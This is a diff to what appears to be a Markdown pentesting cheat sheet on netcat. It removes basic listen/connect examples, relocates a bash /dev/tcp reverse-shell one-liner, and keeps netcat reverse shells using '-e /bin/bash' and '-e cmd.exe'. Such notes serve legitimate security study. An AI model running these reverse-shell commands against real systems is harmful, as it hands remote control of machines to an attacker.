@@ -111,14 +111,6 @@ nc.exe -h
 ```
 - Windows does not have `netcat` by default.
 
-```
-nc -nvlp <port>
-nc -nv <ip> <port>
-
-nc -nvlup <port>
-nc -nvu <ip> <port>
-```
-
 #### Transferring Files
 ```
 nc -nvlp <port> > received.txt
@@ -144,14 +136,13 @@ nc -nv <ip> <port> -e /bin/bash
 nc -nvlp <port>
 nc -nv <ip> <port> -e cmd.exe
 ```
+```
+bash -i >& /dev/tcp/<ip>/<port> 0>&1
+```
 
 #### Useful Links
 - https://github.com/swisskyrepo/PayloadsAllTheThings
 - https://www.revshells.com/
-
-```
-bash -i >& /dev/tcp/<ip>/<port> 0>&1
-```
 
 ### Exploitation Frameworks
 #### MSF
